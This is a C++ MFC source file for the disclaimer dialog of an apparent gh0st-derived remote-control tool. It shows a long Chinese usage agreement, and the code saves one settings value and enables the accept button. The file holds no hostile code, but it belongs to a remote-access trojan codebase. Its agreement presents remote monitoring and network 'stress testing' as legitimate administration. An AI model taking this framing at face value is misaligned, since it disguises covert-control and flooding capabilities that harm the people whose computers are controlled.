// MianZeShengMing.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "MianZeShengMing.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMianZeShengMing dialog


CMianZeShengMing::CMianZeShengMing(CWnd* pParent /*=NULL*/)
	: CDialog(CMianZeShengMing::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMianZeShengMing)
	m_Text = _T("");
	m_CloseAnimate =((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "CloseAllAnimate",false);
	//}}AFX_DATA_INIT

	m_Text ="韩国杀毒远控远控 是一款适合任何个人、公司和家庭用于远程维护、远程协助和远程管理、压力测试的计算机应用软件。用户\r\n"
		"不得利用本软件从事非法用途，如：用于窃取、破坏被控端电脑资料，窃取他人隐私、破坏他人网络等违法行为，任何违法行为都\r\n"
		"将受到法律的制裁。 \r\n"
		"用户使用本软件必须遵守国家的有关法律法规； 如刑法、国家安全法、保密法、计算机信息系统安全保护条例等，\r\n"
		"不得有损害他人（国家）利益的任何行为。 您必须同意此条款方可使用此软件，一旦安装、复制或以其它方式使用\r\n"
		"本软件， 即表示您接受了本协议各项条款的约束。\r\n"
		"\r\n"
		"1．服务条款的确认和接纳 \r\n"
		"本软件用户服务的所有权和运作权归作者拥有。本软件所提供的服务将按照有关章程、服务条款和操作规则严格执\r\n"
		"行。用户使用本软件前应详细阅读软件的版权以及责任声明，所有使用本软件的用户则表示用户与软件作者达成协\r\n"
		"议并接受所有的服务条款。 \r\n"
		"2． 软件简介 \r\n"
		"韩国杀毒远控 远程管理软件通过国际互联网为用户提供对远程计算机操作、控制、监视、对网络吞吐量进行压力测试等功能。 \r\n"
		"用户必须：\r\n"
		"1)购置设备，包括个人电脑、调制解调器等上网装置。\r\n"
		"2)个人上网和支付与此服务有关的电话费用、网络费用。 \r\n"
		"3)具有远程计算机的控制所有权，对控制和监视远程计算机产生的一切后果负责。 \r\n"
		"用户同意： \r\n"
		"1)提供及时、详尽及准确的个人资料。 \r\n"
		"2)不断更新注册资料，符合及时、详尽、准确的要求。所有原始键入的资料将引用为注册资料。\r\n"
		"3)用户同意遵守《中华人民共和国保守国家秘密法》、《中华人民共和国计算机信息系统安全保护条例》、《计算\r\n"
		"机软件保护条例》等有关计算机及互联网规定的法律和法规、实施办法。在任何情况下，本软件作者合理地认为用\r\n"
		"户的行为可能违反上述法律、法规，作者可以在任何时候，不经事先通知终止向该用户提供服务。用户应了解国际\r\n"
		"互联网的无国界性，应特别注意遵守当地所有有关的法律和法规。 \r\n"
		"3．服务条款的修改\r\n"
		"本软件会不定时地更新服务条款，服务条款一旦发生变动，将会在相关页面上提示修改内容。如果您继续使用本软件，\r\n"
		"则表明您已同意改动。 如果您不接受，请退出软件.\r\n"
		"4．服务修订 \r\n"
		"本软件保留随时修改或中断服务而不需告知用户的权利。本站行使修改或中断服务的权利，不需对用户或第三方负\r\n"
		"责。 \r\n"
		"5．用户隐私制度 \r\n"
		"尊重用户个人隐私是本软件的基本政策。本软件作者不会公开、编辑或透露用户的注册内容，除非有法律许可要求\r\n"
		"，或本站在诚信的基础上认为透露这些信件在以下三种情况是必要的：\r\n"
		"1)遵守有关法律规定，遵从合法服务程序。 \r\n"
		"2)保持维护本软件的商标所有权。 \r\n"
		"3)在紧急情况下竭力维护用户个人和社会大众的隐私安全。 \r\n"
		"6．用户的帐号，密码和安全性 \r\n"
		"一旦注册成功成为本软件用户，您将得到一个密码和帐号。如果您不保管好自己的帐号和密码安全，将对因此产生\r\n"
		"的后果负全部责任。另外，每个用户都要对其帐户中的所有活动和事件负全责。您可随时根据指示改变您的密码，\r\n"
		"也可以结束旧的帐户重开一个新帐户。用户若发现任何非法使用用户帐号或安全漏洞的情况，立即通知软件作者。 \r\n"
		"7．免责条款 \r\n"
		"用户明确同意本软件的使用由用户个人承担风险。 \r\n"
		"本软件不作任何类型的担保，不担保服务一定能满足用户的要求，也不担保服务不会受中断，对服务的及时性，安\r\n"
		"全性，出错发生都不作担保。用户理解并接受：任何通过本软件服务取得的信息资料的可靠性取决于用户自己，用\r\n"
		"户自己承担所有风险和责任。 \r\n"
		"8．有限责任 \r\n"
		"本软件对任何直接、间接、偶然、特殊及继起的损害不负责任，这些损害来自：不正当使用本软件服务控制非具有\r\n"
		"控制所有权的远程计算机等，以及引起的经济和法律上的纠纷。 \r\n"
		"9．用户责任\r\n"
		"用户单独承担传输内容的责任。用户必须遵循： \r\n"
		"1)从中国境内向外传输技术性资料时必须符合中国有关法规。\r\n"
		"2)使用本软件不作非法用途。 \r\n"
		"3)不干扰或混乱网络服务。 \r\n"
		"4)不使用本软件发表任何与政治相关的信息。 \r\n"
		"5)遵守所有使用远程控制软件的相关网络协议、规定、程序和惯例。 \r\n"
		"6)不得利用本软件危害国家安全、泄露国家秘密，不得侵犯国家社会集体的和公民的合法权益。 \r\n"
		"7)不得利用本软件制作、复制和传播下列信息： \r\n"
		"1、煽动抗拒、破坏宪法和法律、行政法规实施的； \r\n"
		"2、煽动颠覆国家政权，推翻社会主义制度的； \r\n"
		"3、煽动分裂国家、破坏国家统一的； \r\n"
		"4、煽动民族仇恨、民族歧视，破坏民族团结的； \r\n"
		"5、捏造或者歪曲事实，散布谣言，扰乱社会秩序的； \r\n"
		"6、宣扬封建迷信、淫秽、色情、赌博、暴力、凶杀、恐怖、教唆犯罪的； \r\n"
		"7、公然侮辱他人或者捏造事实诽谤他人的，或者进行其他恶意攻击的； \r\n"
		"8、损害国家机关信誉的； \r\n"
		"9、其他违反宪法和法律行政法规的；\r\n"
		"10、进行商业广告行为的。 \r\n"
		"用户须承诺不传输任何非法的、骚扰性的、中伤他人的、辱骂性的、恐吓性的、伤害性的、庸俗的和淫秽的信息资\r\n"
		"料。另外，用户也不能传输任何教唆他人构成犯罪行为的资料；不能传输长国内不利条件和涉及国家安全的资料；\r\n"
		"不能传输任何不符合当地法规、国家法律和国际法 律的资料。未经许可而非法进入其它电脑系统是禁止的。若用户\r\n"
		"的行为不符合以上的条款，软件作者将取消用户服务帐号。软件捉着将不承担任何违反了以上条款的用户的法律责\r\n"
		"任。一切责任由用户自行负责。 \r\n"
		"10．发送通告\r\n"
		"软件作者所有发给用户的通告都可通过电子邮件或常规的信件传送。但不会通过邮件服务发报消息给用户，告诉他\r\n"
		"们服务条款的修改、服务变更。一切更变请用户们自行留意，如用户在不留意本软件条款更变的前提下触犯法律，\r\n"
		"任何责任由用户自行承担。 \r\n"
		"12．附加信息服务 \r\n"
		"用户在享用本软件提供的服务的同时，亦代表同意接受了声明，并将对自己负责。 \r\n"
		"13．解释权 \r\n"
		"本注册协议的解释权归本软件作者所有。如果其中有任何条款与国家的有关法律相抵触，则以国家法律的明文规定\r\n"
		"为准。 \r\n"
		"14．附加阅读 \r\n"
		"请用户在使用本软件前，阅读以下国家提供的文件。并且在了解后合法使用本软件，任何违法行为及责任用户将自\r\n"
		"行承担。 \r\n"
		"本软件作者将不对以下文章的连接进行及时更新，请用户们自己搜索并查找。\r\n"
		
		"互联网电子公告服务管理规定（全文） \r\n"
		"中华人民共和国计算机信息网络国际联网管理暂行规定 \r\n"
		"中华人民共和国计算机信息网络国际联网管理暂行规定实施办法 \r\n"
		"中华人民共和国计算机信息系统安全保护条例 \r\n"
		"关于加强计算机信息系统国际联网备案管理的通告 \r\n"
		"计算机信息网络国际联网安全保护管理办法\r\n";
}


void CMianZeShengMing::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMianZeShengMing)
	DDX_Control(pDX, IDC_EDIT1, m_Edit);
	DDX_Text(pDX, IDC_EDIT1, m_Text);
	DDX_Check(pDX, IDC_CHECK1, m_CloseAnimate);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CMianZeShengMing, CDialog)
	//{{AFX_MSG_MAP(CMianZeShengMing)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	ON_BN_CLICKED(IDC_RADIO1, OnRadio1)
	ON_BN_CLICKED(IDC_RADIO2, OnRadio2)
	ON_WM_SHOWWINDOW()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMianZeShengMing message handlers

void CMianZeShengMing::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	DestroyWindow();
	PostQuitMessage(0);
	ExitProcess(0);
	CDialog::OnClose();
}

void CMianZeShengMing::OnButton1() 
{
	// TODO: Add your control notification handler code here
	UpdateData();

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "CloseAllAnimate",m_CloseAnimate);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "Animate",m_CloseAnimate);

	OnOK();
}

BOOL CMianZeShengMing::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	(GetDlgItem(IDC_BUTTON1))->EnableWindow(FALSE);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

//(GetDlgItem(IDC_BUTTON1))->EnableWindow(TRUE);

void CMianZeShengMing::OnRadio1() 
{
	// TODO: Add your control notification handler code here
	(GetDlgItem(IDC_BUTTON1))->EnableWindow(TRUE);
}

void CMianZeShengMing::OnRadio2() 
{
	// TODO: Add your control notification handler code here
	(GetDlgItem(IDC_BUTTON1))->EnableWindow(FALSE);
}

BOOL CMianZeShengMing::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if(pMsg->message == WM_KEYDOWN)
	{
		if(pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return TRUE;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CMianZeShengMing::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
	
	// TODO: Add your message handler code here
	m_Edit.SetSel(0,0);
}
